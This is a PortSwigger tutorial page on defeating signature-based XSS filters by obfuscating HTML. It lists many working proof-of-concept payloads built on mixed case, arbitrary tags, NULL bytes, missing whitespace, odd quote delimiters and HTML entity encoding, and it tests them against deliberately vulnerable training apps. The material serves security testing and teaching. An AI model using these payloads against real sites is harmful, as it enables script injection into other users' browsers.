# Bypassing Signature-Based XSS Filters: Modifying HTML

Source: https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html
Fetched: 2026-06-28T09:17:33.834143+00:00

This page may be out of date

We haven't updated it for a while because we're busy working on new, improved content to help you get the

most out of Burp Suite. In the meantime, please note that the information on this page may no longer be

accurate.

Visit our Support Center

Bypassing Signature-Based XSS Filters: Modifying HTML

In many cases, you may find that signature-based filters can be defeated simply by switching to a different, lesser-known method of executing script. If this fails, you need to look at ways of obfuscating your attack.

This article provides examples of ways in which HTML syntax can be obfuscated to defeat common filters.

The example uses versions of "DVWA" and the "Magical Code Injection Rainbow" taken from OWASP's Broken Web Application Project. Find out how to download, install and use this project.

Signature-based filters designed to block XSS attacks normally employ regular expressions or other techniques to identify key HTML components, such as tag brackets, tag names, attribute names, and attribute values.

Many of these filters can be bypassed by placing unusual characters at key points within the HTML in a way that one or more browsers tolerate.

Consider the following simple exploit.

<img onerror=alert(1) src=a>

You can modify this syntax in numerous ways and still have your code execute on at least one browser.

The Tag Name

Starting with the opening tag name, the most simple and naive filters can be bypassed simply by varying the case of the characters used:

<iMg onerror=alert(1) src=a>

Going further, if you modify the example slightly, you can use arbitrary tag names to introduce event handlers, thereby bypassing filters that merely block specific named tags:

<x onclick=alert(1) scr=a>click here</x>

In addition, you can insert NULL bytes in any position.

Note: The NULL byte trick works on Internet Explorer anywhere within the HTML page. Liberal use of NULL bytes often provides a quick way to bypass signature-based filters that are unaware of IE's behavior.

<[%00]img onerror=alert(1) src=a>

Note: In these examples, [%xx] indicates the literal character with the hexadecimal ASCII code of xx.

Space Following the Tag Name

Several characters can replace the space between the tag names and the first attribute name:

<img/onerror=alert(1) src=a>

<img/anyjunk/onerror=alert(1) src=a>

<img """><script>alert("alert(1)")</script>">

Note: even where an attack does not require any tag attributes, you should always try adding some superfluous content after the tag name, because this bypasses some simple filters:

<script/anyjunk>alert(1)</script>

Attribute Delimiters

In the original example, attribute values were not delimited, requiring some whitespace after the attribute value to indicate that it has ended before another attribute can be introduced.

Attributes can optionally be delimited with double or single quotes or, on IE, with backticks:

<img onerror="alert(1)"src=a>

<img onerror='alert(1)'src=a>

<img onerror=`alert(1)`src=a>

Switching around the attributes in the preceding example provides a further way to bypass some filters that check for attribute names starting with on.

<img src='a'onerror=alert(1)>

By combining quote-delimited attributes with unexpected characters following the tag name, attacks can be devised that do not use any whitespace, thereby bypassing some simple filters:

<img/onerror="alert(1)"src=a>

Attribute Names and Values

Within the attribute name and value, you can use the same NULL byte trick described earlier.

<img onerror=a[%00]lert(1) src=a>

<i[%00]mg onerror=alert(1) src=a>

You can also HTML-encode characters within the value:

<img onerror=a&#x6c;ert(1) src=a>

Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters.

It is also worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding may overlook. You can use both decimal and hexadecimal format, add superfluous leading zeros, and omit the trailing semicolon.

<img onerror=a&#x06c;ert(1) src=a>

<img onerror=a&#x006c;ert(1) src=a>

<img onerror=a&#x0006c;ert(1) src=a>

<img onerror=a&#108;ert(1) src=a>

<img onerror=a&#0108;ert(1) src=a>

<img onerror=a&#108ert(1) src=a>
